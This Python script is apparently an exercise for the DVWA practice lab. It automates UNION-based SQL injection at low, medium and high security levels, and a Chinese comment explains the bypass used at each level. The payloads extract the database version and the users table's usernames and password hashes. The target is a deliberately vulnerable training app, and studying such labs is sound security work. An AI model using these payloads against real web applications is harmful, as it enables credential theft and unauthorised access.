from dvwa import DVWA, sql_rows

SECURITY = "low"
PAYLOADS = {
    "low": [
        "-1' UNION SELECT database(),version()#",
        "-1' UNION SELECT user,password FROM users#",
    ],
    "medium": [
        "-1 UNION SELECT database(),version()#",
        "-1 UNION SELECT user,password FROM users#",
    ],
    "high": [
        "-1' UNION SELECT database(),version()#",
        "-1' UNION SELECT user,password FROM users#",
    ],
}
"""
Low: GET, 单引号字符型注入
Medium: POST, 数字型注入, 不需要引号
High: 先把 id 存进 session-input.php, 再 GET 页面, 查询带 LIMIT 1
"""

target = DVWA("sqli", SECURITY)


def fetch(payload):
    data = {"id": payload, "Submit": "Submit"}
    if SECURITY == "low":
        return target.get("", params=data)
    if SECURITY == "medium":
        return target.post("", data=data)
    target.post("session-input.php", data=data)
    return target.get("")


for payload in PAYLOADS[SECURITY]:
    print(f"\n=== {payload} ===")
    rows = sql_rows(fetch(payload).text)
    if not rows:
        print("No result.")
    for first, last in rows:
        print(f"{first} : {last}")
